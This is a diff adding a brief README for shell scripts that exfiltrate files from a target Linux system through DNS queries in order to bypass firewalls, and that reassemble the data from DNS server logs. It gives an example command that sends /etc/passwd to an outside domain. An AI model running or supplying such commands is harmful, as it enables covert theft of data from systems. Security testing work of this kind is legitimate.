@@ -1,0 +1,8 @@
+Lightweight Linux shell script to exfiltrate data from a target system via DNS side channel. Useful when outbound traffic is restricted via firewall.
+Uses command line arguments Target File, Unique Identifier (used to differentiate between multiple exports), Domain Name
+Example usage: ./dns_export.sh /etc/passwd ID1 mydomain.com
+
+To reassembly data exfiltrated via DNS queries, run dns_reassembly.sh on the DNS server log file.
+Uses command line arguments Input File, Unique Identifier from dns_export.sh
+Example usage: ./dns_reassembly /var/log/syslog ID1
+
